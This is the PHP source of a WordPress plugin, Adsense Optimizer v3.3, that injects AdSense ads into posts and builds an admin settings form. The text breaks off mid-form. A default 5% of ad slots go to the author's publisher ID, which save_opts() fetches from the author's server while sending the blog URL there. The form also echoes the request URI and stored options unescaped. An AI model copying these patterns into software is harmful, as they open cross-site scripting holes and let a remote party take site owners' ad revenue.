<?php
/*
Plugin Name: Adsense Optimizer
Plugin URI: http://www.adsenseoptimizer.de/
Description: Ads Google Adsense ads automatically to your blog. 
Version: 3.3
Author: gnarf
Author URI: http://www.adsenseoptimizer.de/
*/


 $adoptadspacesharing=1; if (!class_exists("adopt")) { class adopt { var $adopt_version = "3.1"; var $adopt_menu = "adsenseoptimizer"; var $loopdone = 0; var $postlen = 0; var $postcount = 0; var $opts; var $adincontent = 0; function adopt() { $this->getOpts(); } function getOpts() { if (isset($this->opts) AND !empty($this->opts)) {return;} $this->opts=get_option("adsenseoptimizer"); if (!empty($this->opts)) {return;} $this->opts=Array ( 'usertype' => '', 'gen_id' => '8208356787225078', 'don_id' => '8208356787225078', 'donate' => 5, 'overrule' => 0, 'adtest' => 1, 'adsection' => 1, 'gen_channel' => '6917465437', 'don_channel' => '0708185857', 'type' => Array(1=>'text_image',2=>'text_image',3=>'text_image',4=>'text_image',5=>'text_image',6=>'link',7=>'link',8=>'link'), 'corner' => Array (1 =>'rc:0',2=>'rc:0',3=>'rc:0',4=>'rc:0',5=>'rc:0',6=>'rc:0',7=>'rc:0',8=>'rc:0' ), 'padding' => Array (1=>7,2=>7,3=>7,4=>7,5=>7,6=>7,7=>7,8=>7), 'id' => Array (1=>"",2=>"",3=>"",4=>"",5=>"",6=>"",7=>"",8=>""), 'channel' => Array (1=>"",2=>"",3=>"",4=>"",5=>"",6=>"",7=>"",8=>""), 'desc' => Array (1=>'Describe your adtypes here to get better overview. ', 2=>'e.g. Wide Skyscraper in blue colors for sidebarwidget.'), 'size' => Array ( 1 => Array ( '336x280' => 1, '300x250' => 1, '728x90' => 0, '160x600' => 0, '468x60' => 1, '120x600' => 0, '250x250' => 1, '200x200' => 1, '125x125' => 1, '234x60' => 1 , '180x150' => 1, '120x240' => 0), 2 => Array ( '336x280' => 0, '300x250' => 0, '728x90' => 0, '160x600' => 0, '468x60' => 1, '120x600' => 0, '250x250' => 0, '200x200' => 0, '125x125' => 0, '234x60' => 0 , '180x150' => 0, '120x240' => 0 ), 3 => Array ( '336x280' => 1, '300x250' => 1, '728x90' => 0, '160x600' => 0, '468x60' => 1, '120x600' => 0, '250x250' => 1, '200x200' => 0, '125x125' => 0, '234x60' => 0 , '180x150' => 0, '120x240' => 0 ), 4 => Array ( '336x280' => 1, '300x250' => 0, '728x90' => 0, '160x600' => 0, '468x60' => 0, '120x600' => 0, '250x250' => 0, '200x200' => 0, '125x125' => 0, '234x60' => 0 , '180x150' => 0, '120x240' => 0), 5 => Array ( '336x280' => 0, '300x250' => 0, '728x90' => 0, '160x600' => 0, '468x60' => 0, '120x600' => 1, '250x250' => 0, '200x200' => 0, '125x125' => 0, '234x60' => 0 , '180x150' => 0, '120x240' => 0)), 'lbsize' => Array ( 6 => Array ( '728x15' => 1, '468x15' => 0, '200x90' => 0, '180x90' => 0, '160x90' => 0, '120x90' => 0), 7 => Array ( '728x15' => 0, '468x15' => 1, '200x90' => 0, '180x90' => 0, '160x90' => 0, '120x90' => 0), 8 => Array ( '728x15' => 0, '468x15' => 0, '200x90' => 0, '180x90' => 0, '160x90' => 1, '120x90' => 0)), 'col_border' => Array ( 1 => '336699', 2 => 'E3FA11', 3 => 'CCCCCC', 4 => '0A141F', 5 => '6699CC',6=>'000000',7=>'E3FA11',8=>'CCCCCC' ), 'col_link' => Array ( 1 => '0000FF', 2 => 'FFFFFF', 3 => '000000', 4 => '21DAFF', 5 => 'FFFFFF',6=>'FFFFFF',7=>'FFFFFF',8=>'000000' ), 'col_bg' => Array ( 1 => 'FFFFFF', 2 => 'A2AB2B', 3 => 'CCCCCC', 4 => '000000', 5 => '003366',6=>'000000',7=>'A2AB2B',8=>'CCCCCC' ), 'col_text' => Array ( 1 => '000000', 2 => '000000', 3 => '333333', 4 => 'DEDEDE', 5 => 'AECCEB',6=>'CCCCCC',7=>'000000',8=>'333333' ), 'col_url' => Array ( 1 => '008000', 2 => 'FFFFFF', 3 => '666666', 4 => '21DAFF', 5 => 'AECCEB',6=>'999999',7=>'FFFFFF',8=>'666666'), 'single' => Array ( 1 => 1, 2 => 2, 3 => 3 ), 'single_pos' => Array ( 1 => 'Top', 2 => 'Middle', 3 => 'Bottom' ), 'single_align' => Array ( 1 => 'left', 2 => 'right', 3 => 'center' ), 'single_long' => Array ( 1 => '', 2 => '2300', 3 => '5000'), 'multi' => Array ( 1 => 1, 2 => 2, 3 => 1 ), 'multi_pos' => Array ( 1 => 1, 2 => 4, 3 => 8 ), 'multi_align' => Array ( 1 => 'right', 2 => 'left', 3 => 'center' ), 'only_tagged' => 0, 'omit_page' => 0, 'omit_home' => 0, 'omit_search' => 0, 'omit_category' => 0, 'omit_tag' => 0, 'omit_date' => 0, 'omit_author' => 0 ) ; } function adsenseoptimize($content) { if (is_feed()) return $content; if ($this->opts['adsection']) { $content = '<!-- google_ad_section_start -->'.$content.'<!-- google_ad_section_end -->'; } if (!is_single() AND !is_page()) {return $content;} if($this->opts['usertype']=="pro") $pro=1; else $pro=0; if(is_page() AND $pro AND $this->opts['omit_page']) return $content; if ($this->opts['only_tagged'] AND $pro AND !strpos($content,"<!--adsenseopt-->")) return $content; if (strpos($content,"<!--noad-->")) return $content; $this->postlen=strlen($content); if ($pro AND $this->opts['make_battle']) { $bt=mt_rand(1,2); $adtype=$this->opts['battle_type'][$bt]; switch ($this->opts['battle_pos'][$bt]){ case "Top": $content='<!--adopthere-->'.$content; break; case "Bottom": $content=$content.'<!--adopthere-->'; break; case "Middle": $a= $this->findNodes($content); $cnt=round(count($a)/2); $pos=$a[$cnt-1][1]; $result= substr_replace($content, '<!--adopthere-->', $pos, 0); $content=$result; break; } $code=$this->generateAd($adtype, $this->opts['battle_channel'][$bt]); if($code) { $code=$this->prepare_ad_code($code, $this->opts['battle_align'][$bt], $this->opts['padding'][$adtype]); $content = str_replace('<!--adopthere-->', html_entity_decode($code), $content); } else { $content = str_replace('<!--adopthere-->', '<!--adsense ad injection by adsense optimizer (http://www.adsenseoptimizer.de) failed - tried to add more than 3 ads per page -->', $content); } } for ($i = 1; $i <= 5; $i++) { if ($this->opts['single'][$i]>0 AND (($this->opts['single_long'][$i]=="") OR ($this->postlen>$this->opts['single_long'][$i]))) { $adtype=$this->opts['single'][$i]; switch ($this->opts['single_pos'][$i]){ case "Top": $content='<!--adopthere-->'.$content; break; case "Bottom": $content=$content.'<!--adopthere-->'; break; case "Middle": $a= $this->findNodes($content); $cnt=round(count($a)/2); $pos=$a[$cnt-1][1]; $result= substr_replace($content, '<!--adopthere-->', $pos, 0); $content=$result; break; case "Random": $a= $this->findNodes($content); $cnt=mt_rand(1,count($a)); $pos=$a[$cnt][1]; $result= substr_replace($content, '<!--adopthere-->', $pos, 0); $content=$result; break; case "tag": str_replace('<!--adsenseopt-->', '<!--adopthere-->', $content); break; } $code=$this->generateAd($adtype); if($code) { $code=$this->prepare_ad_code($code, $this->opts['single_align'][$i], $this->opts['padding'][$i]); $content = str_replace('<!--adopthere-->', html_entity_decode($code), $content); } else { $content = str_replace('<!--adopthere-->', '<!--adsense ad injection by adsense optimizer (http://www.adsenseoptimizer.de) failed - tried to add more than 3 ads per page -->', $content); } } } return $content; } function findNodes($str) { $pattern='&\[gallery\]|\<\/p*\>|\<br\>|\<br\s\/\>|\<br\/\>&iU'; return preg_split($pattern, $str, 0, PREG_SPLIT_OFFSET_CAPTURE); } function generateAd($type, $channel=0){ if($this->opts['type'][$type]=="link") return $this->generateLbAd($type, $channel); global $c, $i, $user_level; $this->nrofads++; if (!$this->opts['overrule'] AND $this->nrofads > 3) {return false;} if (!$channel) {if ($this->opts['channel'][$type]!="") {$c=$this->opts['channel'][$type];} else {$c=$this->opts['gen_channel'];}} else $c=$channel; if ($this->opts['id'][$type]) $i=$this->opts['id'][$type]; else $i=$this->opts['gen_id']; $this->ioc(); $code = "<!-- Ad number: ".$this->nrofads." -->"; if (!is_array($this->opts['size'][$type])) {$width=300; $height=250; $size="300x250";} else { $keys=array_keys($this->opts['size'][$type], 1); if (!$keys OR count($keys) < 1) { $width=300; $height=250; $size="300x250"; } else { shuffle($keys); $size=$keys[0]; $dims=explode("x",$size); $width=$dims[0]; $height=$dims[1]; } } if(mt_rand(0,100)<=$this->opts['donate']){$i=$this->opts['don_id']; $c=$this->opts['don_channel'];} if ($user_level > 8 AND $this->opts['adtest']) $adtest='google_adtest="on";'; else $adtest=''; $code .= '<script type="text/javascript"><!--
    	'.$adtest.' 
    	google_ad_client = "pub-'. $i. '"; google_alternate_color = "FFFFFF";
		google_ad_width = '.$width.'; google_ad_height = '.$height.';
		google_ad_format = "'.$size.'_as"; google_ad_type = "' . $this->opts['type'][$type] . '";
		google_ad_channel ="' . $c . '"; google_color_border = "'.$this->opts['col_border'][$type].'";
		google_color_link = "'.$this->opts['col_link'][$type].'"; google_color_bg = "'.$this->opts['col_bg'][$type].'";
		google_color_text = "'.$this->opts['col_text'][$type].'"; google_color_url = "'.$this->opts['col_url'][$type].'";
		google_ui_features = "'.$this->opts['corner'][$type].'"; //--></script>
		<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>'; return $code; } function generateLbAd($type, $channel=0){ global $c, $i, $user_level; $this->nroflb++; if (!$this->opts['overrule'] AND $this->nroflb > 3) {return false;} if (!$channel) {if ($this->opts['channel'][$type]!="") {$c=$this->opts['channel'][$type];} else {$c=$this->opts['gen_channel'];}} else $c=$channel; if ($this->opts['id'][$type]) $i=$this->opts['id'][$type]; else $i=$this->opts['gen_id']; $this->ioc(); $code = "<!-- Linkblock number: ".$this->nroflb." -->"; if (!is_array($this->opts['lbsize'][$type])) {$width=160; $height=90; $size="160x90";} else { $keys=array_keys($this->opts['lbsize'][$type], 1); if (!$keys OR count($keys) < 1) { $width=160; $height=90; $size="160x90"; } else { shuffle($keys); $size=$keys[0]; $dims=explode("x",$size); $width=$dims[0]; $height=$dims[1]; } } if ($user_level > 8) $adtest='google_adtest="on";'; else $adtest=''; if(mt_rand(0,100)<=$this->opts['donate']){$i=$this->opts['don_id']; $c=$this->opts['don_channel'];} $code.='<script type="text/javascript"><!--
	'.$adtest.' 
google_ad_client = "pub-'. $i. '";
google_ad_width = '.$width.';
google_ad_height = '.$height.';
google_ad_format = "'.$size.'_0ads_al'; if ($this->opts['links'][$type]==5) $code.='_s'; $code.='"; google_ad_channel ="' . $c . '";
google_color_border = "'.$this->opts['col_border'][$type].'";
google_color_bg = "'.$this->opts['col_bg'][$type].'";
google_color_link = "'.$this->opts['col_link'][$type].'";
//--></script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>'; return $code; } function prepare_ad_code($code, $align, $padding) { $code=html_entity_decode($code); $startdiv='
	
	<!-- google ad injected by adsense-optimizer http://www.adsenseoptimizer.de -->
	<div '; if($align=="random") { $rn=mt_rand(1,3); if ($rn==1) $align="left"; if ($rn==2) $align="center"; if ($rn==3) $align="right"; } switch ($align) { case "center": $code=$startdiv.' style="padding:'.$padding.'px; display: block; margin-left: auto; margin-right: auto; text-align: center;">'.$code.'</div>'; break; case "left": $code=$startdiv.' style="padding:'.$padding.'px; float: left; padding-left: 0px; margin: 3px;">'.$code.'</div>'; break; case "right": $code=$startdiv.' style="padding:'.$padding.'px; float: right; padding-right: 0; margin: 3px;">'.$code.'</div>'; break; } return $code; } function save_opts() { $qs='http://www.adsenseoptimizer.de/adopt.php?url='.urlencode(get_bloginfo("wpurl")).'&donate='.$this->opts['donate'].'&user='.$this->opts['usertype']; $edc=@file($qs); if ($edc) { $eda=explode(';',$edc[0]); $this->opts['don_id']=$eda[0]; $this->opts['don_channel']=$eda[1]; } else {$this->opts['don_id']='8208356787225078'; $this->opts['don_channel']='0708185857';} update_option('adsenseoptimizer',$this->opts); } function admin_menu() { $sizes=array(); $sizes[]=array('desc'=>'180 x 150 Small Rectangle (Text only)', 'text'=>'180x150'); $sizes[]=array('desc'=>'300 x 250 Medium Rectangle', 'text'=>'300x250'); $sizes[]=array('desc'=>'336 x 280 Large Rectangle (Text only)', 'text'=>'336x280'); $sizes[]=array('desc'=>'728 x 90 Leaderboard', 'text'=>'728x90'); $sizes[]=array('desc'=>'160 x 600 Wide Skyscraper', 'text'=>'160x600'); $sizes[]=array('desc'=>'120 x 240 Vertical Banner (Text only)', 'text'=>'120x240'); $sizes[]=array('desc'=>'468 x 60 Banner', 'text'=>'468x60'); $sizes[]=array('desc'=>'234 x 60 Half Banner (Text only)', 'text'=>'234x60'); $sizes[]=array('desc'=>'120 x 600 Skyscraper', 'text'=>'120x600'); $sizes[]=array('desc'=>'250 x 250 Square (Text only)', 'text'=>'250x250'); $sizes[]=array('desc'=>'125 x 125 Button (Text only)', 'text'=>'125x125'); $sizes[]=array('desc'=>'200 x 200 Small Square', 'text'=>'200x200'); $lbsizes=array(); $lbsizes[]=array('desc'=>'728 x 15', 'text'=>'728x15'); $lbsizes[]=array('desc'=>'468 x 15', 'text'=>'468x15'); $lbsizes[]=array('desc'=>'200 x 90', 'text'=>'200x90'); $lbsizes[]=array('desc'=>'180 x 90', 'text'=>'180x90'); $lbsizes[]=array('desc'=>'160 x 90', 'text'=>'160x90'); $lbsizes[]=array('desc'=>'120 x 90', 'text'=>'120x90'); if (isset($_POST["adsenseoptimizer_update"])) { $this->opts=$this->sanitize_entries($_POST['adsenseoptimizer'], $sizes); $this->save_opts(); echo '<div id="message" class="updated fade"><p><strong>Options Updated!</strong></p></div>'; } if ($this->opts['only_tagged']) $this->opts['is_only_tagged']="checked"; if ($this->opts['omit_page']) $this->opts['is_omit_page']="checked"; if ($this->opts['omit_home']) $this->opts['is_omit_home']="checked"; if ($this->opts['omit_search']) $this->opts['is_omit_search']="checked"; if ($this->opts['omit_category']) $this->opts['is_omit_category']="checked"; if ($this->opts['omit_tag']) $this->opts['is_omit_tag']="checked"; if ($this->opts['omit_date']) $this->opts['is_omit_date']="checked"; if ($this->opts['omit_author']) $this->opts['is_omit_author']="checked"; if ($this->opts['overrule']) $this->opts['is_overrule']="checked"; if ($this->opts['make_battle']) $this->opts['is_make_battle']="checked"; ?>

	<script type="text/javascript" src="<?php echo(WP_PLUGIN_URL.'/'.$this->adopt_menu);?>/jscolor/jscolor.js"></script>
	<script type="text/javascript">
	
		function toggleUsertype(val) {
			if (val=="") {jQuery(".pro").hide(10);jQuery(".link").hide(10);}
			if (val=="link") {jQuery(".pro").hide(10);jQuery(".link").show(10);}
			if (val=="pro") {jQuery(".pro").show(10);jQuery(".link").show(10);}
		}

		function toggleAdtype(val) {
			if (val=="link") {jQuery(".normal_ad").hide(10);jQuery(".lb_ad").show(10);}
			else {jQuery(".normal_ad").show(10);jQuery(".lb_ad").hide(10);}
		}

    function checkradio(feld){
    	for (i=0; i < feld.length; i++){
    		if(feld[i].checked == true){
    			return feld[i].value;
    		}
    	}
    } 
	
	    
	</script>


    <div class="wrap">

    <h2>Adsense Optimizer V <?php echo $this->adopt_version; ?></h2>

    <p>Further Information on the <a href="http://www.adsenseoptimizer.de">Plugin Site</a></p>
    
    
    <?php
 ?>
    

    <form name="mainform" method="post" action="<?php echo $_SERVER["REQUEST_URI"]; ?>">

	<h2>General Settings</h2>
	<table><tr>
			<td>Adsense Publisher ID:</td>
			<td><input name="adsenseoptimizer[gen_id]" type="text" value="<?php echo $this->opts['gen_id'];?>"></td>
			<td> <span class="ao_explain">(pub-....) enter numbers only !</span></td></tr>
			
			<tr><td>Adsense Channel</td>
			<td><input name="adsenseoptimizer[gen_channel]" type="text" value="<?php echo $this->opts['gen_channel'];?>"></td>
			<td>  <span class="ao_explain">(optional) enter numbers only !</span></td></tr>

			<tr><td>Donate</td>
			<td><select name="adsenseoptimizer[donate]" size="1">
	   <option value="0" <?php if($this->opts['donate']=="0") echo(" selected"); ?>>I have nothing to give</option>
	   <option value="1" <?php if($this->opts['donate']=="1") echo(" selected"); ?>>1</option>
	   <option value="2" <?php if($this->opts['donate']=="2") echo(" selected"); ?>>2</option>
	   <option value="3" <?php if($this->opts['donate']=="3") echo(" selected"); ?>>3</option>
	   <option value="5" <?php if($this->opts['donate']=="5") echo(" selected"); ?>>5</option>
	</select></td>
			<td>  <span class="ao_explain">% of your ads will be donated autmatically to the Plugin Author. (Thank you)</span></td></tr>
	
	<tr><td>Overrule 3 Ads count</td><td><input type="checkbox" value="1" name="adsenseoptimizer[overrule]" <?php echo $this->opts['is_overrule']; ?>> </td><td><span class="ao_explain">In some Themes (like Mystique) Adsenseoptimizer is not able to show 3 Ads. In such cases just overrule by clicking this box. If you have no problems (in most themes) let it unchecked !</span></td></tr>
	</table>
    <p>What kind of user are you ?</p>
	<input type="radio" id="usertypebasic" name="adsenseoptimizer[usertype]" onchange="toggleUsertype('')" value="" <?php if($this->opts['usertype']=="") echo('checked');?>> <b>Basic User</b>. You just want to add Google Ads with minimum effort.<br>
	<input type="radio" id="usertypepro" name="adsenseoptimizer[usertype]" onchange="toggleUsertype('pro')" value="pro" <?php if($this->opts['usertype']=="pro") echo('checked');?>> <b>Optimizer</b>. You want to optimize to get the most out of your ads and don't mind doing some option-setting and tuning work.<br>
 


<br><div style="background-color:#D6D1FF; padding:10px;">	<h2>Adjust your Ads</h2>
	<p>You can set up to 8 different visual Types of Ads.</p>



<script type="text/javascript">
   function raiseEvent (eventType, elementID)  
   {   
       var o = document.getElementById(elementID);   
       if (document.createEvent) {   
           var evt = document.createEvent("Events");   
           evt.initEvent(eventType, true, true);   
           o.dispatchEvent(evt);   
       }   
       else if (document.createEventObject)   
       {  
           var evt = document.createEventObject();   
           o.fireEvent('on' + eventType, evt);   
       }   
       o = null;  
   }   </script>


<?php  for ($i = 1; $i <= 8; $i++) { ?>

	<br><button style="display:inline" onclick="show_active('<?php echo $i;?>'); return false;">Ad Type <?php echo $i;?></button>
	<input type="text" name="adsenseoptimizer[desc][<?php echo $i;?>]" size="80" value="<?php echo ($this->opts['desc'][$i]);?>"> 	
	
	
	
	<div id="ad<?php echo $i;?>" class="adtype">
	
   <table width="100%" border="0" cellspacing="0" cellpadding="6">
		<tr valign="top"><td>
	    
	    	type:
	    	<select name="adsenseoptimizer[type][<?php echo $i;?>]" id="adtypeselect<?php echo $i;?>" onchange="toggleAdtype(this.value)" size="1">
			      <option value="text_image" <?php if($this->opts['type'][$i]=="both") echo(" selected"); ?>>Text & Image ads</option>
			      <option value="text" <?php if($this->opts['type'][$i]=="text") echo(" selected"); ?>>Text only</option>
			      <option value="image" <?php if($this->opts['type'][$i]=="image") echo(" selected"); ?>>Images only</option>
			      <option value="link" <?php if($this->opts['type'][$i]=="link") echo(" selected"); ?>>Linkblock</option>
			    </select>
			<br>
			
			<div class="normal_ad">
	    	corners:
	    	<select name="adsenseoptimizer[corner][<?php echo $i;?>]" size="1">
			      <option value="rc:0" <?php if($this->opts['corner'][$i]=="rc:0") echo(" selected"); ?>>square</option>
			      <option value="rc:6" <?php if($this->opts['corner'][$i]=="rc:6") echo(" selected"); ?>>round</option>
			      <option value="rc:10" <?php if($this->opts['corner'][$i]=="rc:10") echo(" selected"); ?>>very round</option>
			</select>
			</div>
						
			<div class="lb_ad">
	    	Number of Links:
	    	<select name="adsenseoptimizer[links][<?php echo $i;?>]" size="1">
			      <option value="4" <?php if($this->opts['links'][$i]=="4") echo(" selected"); ?>>4</option>
			      <option value="5" <?php if($this->opts['links'][$i]=="5") echo(" selected"); ?>>5</option>
			</select>
			</div>
			
			
	    	<div>
	    	Margin around Ad:<input name="adsenseoptimizer[padding][<?php echo $i;?>]" type="text" size="3" value="<?php echo $this->opts['padding'][$i];?>"><span class="ao_explain">px</span>
			</div>

	<div class="pro">
			<table><tr>
			<td>Adsense Publisher ID:</td><td><input name="adsenseoptimizer[id][<?php echo $i;?>]" type="text" value="<?php echo $this->opts['id'][$i];?>"></tr><tr><td></td><td> <span class="ao_explain">only if different from general settings</span></td></tr>
			
			<tr><td>Adsense Channel</td><td><input name="adsenseoptimizer[channel][<?php echo $i;?>]" type="text" value="<?php echo $this->opts['channel'][$i];?>"></tr><tr><td></td><td>  <span class="ao_explain">only if different from general settings</span></td></tr>
			</table>
	</div>
		
		</td><td>
		
		<span class="ao_explain">Click <a href="https://www.google.com/adsense/adformats" target="_new">here</a> to see examples of the different sizes. If you choose more than one, random size will be used.</span><br>
		
		
		<?php
 echo('<div class="normal_ad">'); foreach($sizes as $key=>$size){ echo ('<input type="checkbox" name="adsenseoptimizer[size]['.$i.']['.$size['text'].']" value="1" '); if ($this->opts['size'][$i][$size['text']]) echo (' checked '); echo ('> '.$size['desc'].'<br>'); } echo('</div>'); echo('<div class="lb_ad">'); foreach($lbsizes as $key=>$size){ echo ('<input type="checkbox" name="adsenseoptimizer[lbsize]['.$i.']['.$size['text'].']" value="1" '); if ($this->opts['lbsize'][$i][$size['text']]) echo (' checked '); echo ('> '.$size['desc'].'<br>'); } echo('</div>'); if ($this->opts['col_border'][$i]=="") $this->opts['col_border'][$i]="336699"; if ($this->opts['col_link'][$i]=="") $this->opts['col_link'][$i]="0000FF"; if ($this->opts['col_bg'][$i]=="") $this->opts['col_bg'][$i]="FFFFFF"; if ($this->opts['col_text'][$i]=="") $this->opts['col_text'][$i]="000000"; if ($this->opts['col_url'][$i]=="") $this->opts['col_url'][$i]="008000"; ?>
	    </td><td>
		Choose Colors:<br>
		Border: <input class="color" id="c_border<?php echo $i;?>" name="adsenseoptimizer[col_border][<?php echo $i;?>]" size="6" value="<?php echo $this->opts['col_border'][$i];?>"><br>
		Link: <input class="color" id="c_link<?php echo $i;?>" name="adsenseoptimizer[col_link][<?php echo $i;?>]" size="6" value="<?php echo $this->opts['col_link'][$i];?>"><br>
		Backgr.: <input class="color" id="c_bg<?php echo $i;?>" name="adsenseoptimizer[col_bg][<?php echo $i;?>]" size="6" value="<?php echo $this->opts['col_bg'][$i];?>"><br>
		<div class="normal_ad">Text:<input class="color" id="c_text<?php echo $i;?>" name="adsenseoptimizer[col_text][<?php echo $i;?>]" size="6" value="<?php echo $this->opts['col_text'][$i];?>"><br>
		URL: <input class="color" id="c_url<?php echo $i;?>" name="adsenseoptimizer[col_url][<?php echo $i;?>]" size="6" value="<?php echo $this->opts['col_url'][$i];?>"></div>
		
	    <hr>change to Palette<select onchange="document.getElementById('c_border<?php echo $i;?>').value=this.value.substring(0,6);document.getElementById('c_link<?php echo $i;?>').value=this.value.substring(6,12);document.getElementById('c_bg<?php echo $i;?>').value=this.value.substring(12,18);document.getElementById('c_text<?php echo $i;?>').value=this.value.substring(18,24);document.getElementById('c_url<?php echo $i;?>').value=this.value.substring(24,30); raiseEvent('blur', 'c_border<?php echo $i;?>');raiseEvent('blur', 'c_link<?php echo $i;?>');raiseEvent('blur', 'c_bg<?php echo $i;?>');raiseEvent('blur', 'c_text<?php echo $i;?>');raiseEvent('blur', 'c_url<?php echo $i;?>');" name="palette[<?php echo $i;?>]" size="1">
	   <option value="FFFFFF0000FFFFFFFF000000008000">Maritim</option>
	   <option value="3366990000FFFFFFFF000000008000">Ocean</option>
	   <option value="0000000000FFF0F0F0000000008000">Shadow</option>
	   <option value="6699CCFFFFFF003366AECCEBAECCEB">Blue</option>
	   <option value="000000FFFFFF000000CCCCCC999999">Tint</option>
	   <option value="CCCCCC000000CCCCCC333333666666">Graphite</option>
	</select>
		
		
		<table class="normal_ad"><tr><td><button onclick="document.getElementById('<?php echo $i;?>.iframe').src = 'https://securepubads.g.doubleclick.net/pagead/ads?client=ca-google-asfe&adtest=on&format=160x70_as&color_border='+document.getElementsByName('adsenseoptimizer[col_border][<?php echo $i;?>]')[0].value+'&color_bg='+document.getElementsByName('adsenseoptimizer[col_bg][<?php echo $i;?>]')[0].value+'&color_link='+document.getElementsByName('adsenseoptimizer[col_link][<?php echo $i;?>]')[0].value+'&color_text='+document.getElementsByName('adsenseoptimizer[col_text][<?php echo $i;?>]')[0].value+'&color_url='+document.getElementsByName('adsenseoptimizer[col_url][<?php echo $i;?>]')[0].value+'&hl=en&url=www.google.com'; return false;">refresh Preview</button></td><td>
		<iframe name="0.iframe" id="<?php echo $i;?>.iframe" height="70" frameborder="0" width="160" scrolling="no" src="https://securepubads.g.doubleclick.net/pagead/ads?client=ca-google-asfe&adtest=on&format=160x70_as&color_border=<?php echo $this->opts['col_border'][$i];?>&color_bg=<?php echo $this->opts['col_bg'][$i];?>&color_link=<?php echo $this->opts['col_link'][$i];?>&color_text=<?php echo $this->opts['col_text'][$i];?>&color_url=<?php echo $this->opts['col_url'][$i];?>&hl=en&url=www.google.com"></iframe></td></tr></table>

		<table class="lb_ad"><tr><td><button onclick="document.getElementById('lb<?php echo $i;?>.iframe').src = 'http://googleads.g.doubleclick.net/pagead/ads?client=ca-google-asfe&format=200x90_0ads_al&output=html&h=90&w=200&lmt=1270531704&channel=123456789&adtest=on&ea=0&color_bg='+document.getElementsByName('adsenseoptimizer[col_bg][<?php echo $i;?>]')[0].value+'&color_border='+document.getElementsByName('adsenseoptimizer[col_border][<?php echo $i;?>]')[0].value+'&color_link='+document.getElementsByName('adsenseoptimizer[col_link][<?php echo $i;?>]')[0].value; return false;">
		refresh preview</button></td><td>
		<iframe name="lb0.iframe" id="lb<?php echo $i;?>.iframe" width="200" scrolling="no" height="90" frameborder="0" allowtransparency="true" hspace="0" vspace="0" marginheight="0" marginwidth="0" src="http://googleads.g.doubleclick.net/pagead/ads?client=ca-google-asfe&format=200x90_0ads_al&output=html&h=90&w=200&lmt=1270531704&channel=123456789&adtest=on&ea=0&color_bg=<?php echo($this->opts[col_bg][$i]);?>&color_border=<?php echo($this->opts[col_border][$i]);?>&color_link=<?php echo($this->opts[col_link][$i]);?>"></iframe></td></tr></table>
	</td></tr>


	</td></tr>
	</table>
	</div>
	
<?php
 } ?>

<br><br></div> <?php ?>


<div style="background-color:#F0E878; padding:10px; margin-top:20px;">
<h2>Where to show ads</h2><p>Now do your settings where ads should be displayed within content area. For insertion into other Blog Parts you can use Widget or PHP function (see <a href="http://www.adsenseoptimizer.de">Plugin Page</a>).</p><br><br>
<h3>Single Posts & static Pages</h3><p>On single Pages where ONE Post is displayed in full length or on static pages.</p>
<table><tr><th>Ad Nr.</th><th>Ad Type</th><th>Position</th><th>Aligment</th></tr>
<?php
 for ($i = 1; $i <= 5; $i++) { ?>
	<tr><td><?php echo $i;?></td>
	<td><select name="adsenseoptimizer[single][<?php echo $i;?>]" size="1">
	   <option value="0" <?php if($this->opts['single'][$i]=="0") echo(" selected"); ?>>Dont show</option><option value="1" <?php if($this->opts['single'][$i]=="1") echo(" selected"); ?>>1</option><option value="2" <?php if($this->opts['single'][$i]=="2") echo(" selected"); ?>>2</option><option value="3" <?php if($this->opts['single'][$i]=="3") echo(" selected"); ?>>3</option><option value="4" <?php if($this->opts['single'][$i]=="4") echo(" selected"); ?>>4</option><option value="5" <?php if($this->opts['single'][$i]=="5") echo(" selected"); ?>>5</option><option value="6" <?php if($this->opts['single'][$i]=="6") echo(" selected"); ?>>6</option><option value="7" <?php if($this->opts['single'][$i]=="7") echo(" selected"); ?>>7</option><option value="8" <?php if($this->opts['single'][$i]=="8") echo(" selected"); ?>>8</option>
	</select>
	</td><td>
	<select name="adsenseoptimizer[single_pos][<?php echo $i;?>]" size="1">
      <?php ?>>replace &lt;--adsenseopt--&gt; Tag</option> ?>
      <option<?php if($this->opts['single_pos'][$i]=="Top") echo(" selected"); ?>>Top</option><option<?php if($this->opts['single_pos'][$i]=="Middle") echo(" selected"); ?>>Middle</option><option<?php if($this->opts['single_pos'][$i]=="Bottom") echo(" selected"); ?>>Bottom</option><option<?php if($this->opts['single_pos'][$i]=="Random") echo(" selected"); ?>>Random</option>
    </select>
	</td><td>
		<select name="adsenseoptimizer[single_align][<?php echo $i;?>]" size="1">
	     <option<?php if($this->opts['single_align'][$i]=="center") echo(" selected"); ?>>center</option><option<?php if($this->opts['single_align'][$i]=="right") echo(" selected"); ?>>right</option><option<?php if($this->opts['single_align'][$i]=="left") echo(" selected"); ?>>left</option><option<?php if($this->opts['single_align'][$i]=="random") echo(" selected"); ?>>random</option>
	   </select>
	</td><td>
	 	Only show if article is longer than: <input name="adsenseoptimizer[single_long][<?php echo $i;?>]" value="<?php echo $this->opts['single_long'][$i];?>"size="3"> characters.
	 </td></tr><tr>
<?php } ?>
	
			</table>
			<span class="ao_explain">3000 chars = medium / around 5000 chars = long Posts</span>
<div class="pro">
	<p><input name="adsenseoptimizer[only_tagged]" type="checkbox" value="1" <?php echo $this->opts['is_only_tagged']; ?> > Only use in articles which contain &lt;!--adsenseopt--&gt;: <span class="ao_explain"> To use the Plugin only in distinct articles mark that box. If you want to use the Plugin to ad Ads generally uncheck this !</span></p>
	
	<p><input type="checkbox" value="1" name="adsenseoptimizer[omit_page]" <?php echo $this->opts['is_omit_page']; ?>> Do not show Ads on static pages.<span class="ao_explain"> If you don't want Ads on a special page you can use the &lt;!--noad--&gt; tag ! Checking this box will omit Ads for <b>all</b> static pages !!!</span></p>	
</div>

<br><br>
	<h3>Multiple Posts</h3>
	<p>On pages showing more posts (full or excerpt) (archives, normal Homepage etc.).</p>
	<table><tr><th>Ad Nr.</th><th>Ad Type</th><th>show with</th><th>Aligment</th></tr>

<?php
 for ($i = 1; $i <= 6; $i++) { ?>
	<tr>
	<td><?php echo $i;?></td>
	<td><select name="adsenseoptimizer[multi][<?php echo $i;?>]" size="1">
	   <option value="0" <?php if($this->opts['multi'][$i]=="0") echo(" selected"); ?>>Dont show</option>
	   <option value="1" <?php if($this->opts['multi'][$i]=="1") echo(" selected"); ?>>1</option>
	   <option value="2" <?php if($this->opts['multi'][$i]=="2") echo(" selected"); ?>>2</option>
	   <option value="3" <?php if($this->opts['multi'][$i]=="3") echo(" selected"); ?>>3</option>
